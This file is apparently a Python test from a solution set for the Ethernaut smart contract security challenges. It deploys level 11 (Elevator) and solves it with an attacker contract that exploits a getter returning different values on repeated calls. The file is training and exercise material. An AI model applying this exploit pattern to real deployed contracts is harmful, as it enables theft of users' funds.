from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv11_elevator import Elevator
from pytypes.contracts.attacker.lv11_smart_building import SmartBuilding

@default_chain.connect()
def test_lv11():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv11()
    exploit_lv11(contract)
    ethernaut.check_lv11(contract)

def exploit_lv11(contract: Elevator):
    # Attack vector: function isLastFloor is called twice instead of saving its value
    # Training: wrongly assuming that calling method (getter) returns the same value every time

    building = SmartBuilding.deploy()
    building.goToWith(13, contract.address)
